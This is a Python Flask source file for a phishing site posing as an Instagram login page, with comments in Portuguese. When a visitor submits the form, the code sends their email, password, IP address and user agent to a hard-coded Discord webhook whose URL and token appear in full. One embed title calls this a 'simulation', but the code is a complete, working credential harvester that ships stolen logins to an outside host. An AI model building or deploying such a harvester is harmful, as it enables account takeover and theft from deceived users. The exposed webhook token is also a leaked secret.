from flask import Flask, request, render_template
import requests

app = Flask(__name__, static_url_path='/static', static_folder='static', template_folder='templates')

WEBHOOK = "https://discord.com/api/webhooks/1356839163147718748/A_Zyk_K5W2jZ0HBvWSGw0zawccTqiJE994zNqha7xXU_bh-4kl3RXcTdS-mrjjbg7YBK"  # Substitua pelo seu

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")
        ip = request.remote_addr
        user_agent = request.headers.get("User-Agent")

        data = {
            "username": "Instagram Clone Logger",
            "embeds": [
                {
                    "title": "Credenciais capturadas (simulação)",
                    "color": 0x00FFFF,
                    "fields": [
                        {"name": "Email/Login", "value": email, "inline": True},
                        {"name": "Senha", "value": password, "inline": True},
                        {"name": "IP", "value": ip, "inline": False},
                        {"name": "User-Agent", "value": user_agent, "inline": False}
                    ]
                }
            ]
        }

        try:
            requests.post(WEBHOOK, json=data)
        except Exception as e:
            print("[!] Falha ao enviar para o webhook:", e)

        return "<h2>Login processado. Obrigado!</h2>"

    return render_template("index.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
